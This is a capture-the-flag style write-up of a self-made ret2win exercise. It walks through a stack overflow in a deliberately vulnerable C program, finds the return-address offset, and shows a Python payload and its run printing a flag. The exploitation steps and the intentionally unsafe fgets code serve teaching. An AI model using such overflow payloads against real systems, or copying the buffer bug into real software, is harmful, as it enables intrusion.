---
title: ret2win
event: Self-authored practice challenge
category: pwn
date: 2026-09-30
points: 0
---

# self-authored-ret2win

Not from a real competition — a small classic ret2win I wrote to have an honest, from-scratch pwn writeup: source, compiled binary, exploit, all in this folder, actually run.

`vuln.c` reads input into a 64-byte stack buffer with `fgets(buf, 256, stdin)` — the size argument doesn't match the buffer's real size, so a long enough line overflows past `buf` into the saved return address. `win()` is never called from `main()`; the only way to reach it is to hijack control flow.

Compiled with protections stripped down on purpose so the mechanics are visible:

```
gcc -m64 -fno-stack-protector -no-pie -o vuln vuln.c
```

(GCC actually warns about the bug at compile time — `fgets writing 256 bytes into a region of size 64 overflows the destination` — which is exactly the point.)

## Step 1 — find the offset

`objdump -d vuln`, function `vulnerable`:

```
4011d8: sub    $0x40,%rsp          ; 64-byte stack frame
401206: lea    -0x40(%rbp),%rax    ; buf == rbp-0x40
40120a: mov    $0x100,%esi         ; fgets(buf, 0x100, stdin)
```

`buf` sits at `rbp-0x40`, i.e. 64 bytes below the saved `rbp`. Stack layout from low to high address: `[64 bytes of buf][8-byte saved rbp][8-byte return address]`. So the offset from the start of `buf` to the return address is `64 + 8 = 72` bytes.

## Step 2 — find win()'s address

No PIE (`-no-pie`), so addresses are fixed at compile time — no leak needed:

```
$ objdump -d vuln | grep '<win>:'
00000000004011b6 <win>:
```

## Step 3 — build the payload

72 bytes of filler, then `win`'s address as an 8-byte little-endian pointer:

```python
payload = b"A" * 72 + struct.pack("<Q", 0x4011B6)
```

(`solve.py` does exactly this and writes `payload.bin`.)

## Step 4 — run it

```
$ python3 solve.py
wrote payload.bin (80 bytes)

$ ./vuln < payload.bin
say something: you said: AAAA...AAAA
flag{stack_smash_and_call_the_neighbors}
Segmentation fault
```

The flag prints, then the process segfaults — expected: `win()` returns into whatever garbage is above it on the stack since nothing chained a clean exit after it. For a plain "get code execution once" ret2win that's fine; a real chain would return into something controlled instead (e.g. another gadget, or `exit()`).

## Files

- `vuln.c` — source (also: `gcc`'s own compiler warning names the bug)
- `vuln` — the compiled binary that was actually exploited above
- `solve.py` — builds `payload.bin`
